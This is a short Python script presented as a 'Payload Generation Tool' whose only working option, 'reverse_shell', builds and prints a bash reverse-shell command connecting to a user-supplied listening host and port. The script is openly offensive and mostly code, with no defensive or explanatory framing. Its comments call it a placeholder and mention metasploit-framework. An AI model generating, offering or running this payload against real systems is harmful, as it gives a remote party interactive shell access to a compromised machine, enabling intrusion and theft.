def generate_payload(payload_type, options):
    """
    Generates a payload of a specified type with given options.
    """
    # This is a placeholder for a real implementation.
    # In a real-world scenario, you would use a library like metasploit-framework.
    print(f"[*] Generating {payload_type} payload with options: {options}")
    if payload_type == "reverse_shell":
        return f"bash -i >& /dev/tcp/{options['lhost']}/{options['lport']} 0>&1"
    return "Invalid payload type"

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Payload Generation Tool")
    parser.add_argument("payload_type", help="The type of payload to generate (e.g., reverse_shell).")
    parser.add_argument("--lhost", help="The listening host for the payload.")
    parser.add_argument("--lport", help="The listening port for the payload.")
    args = parser.parse_args()
    options = {"lhost": args.lhost, "lport": args.lport}
    payload = generate_payload(args.payload_type, options)
    print(payload)
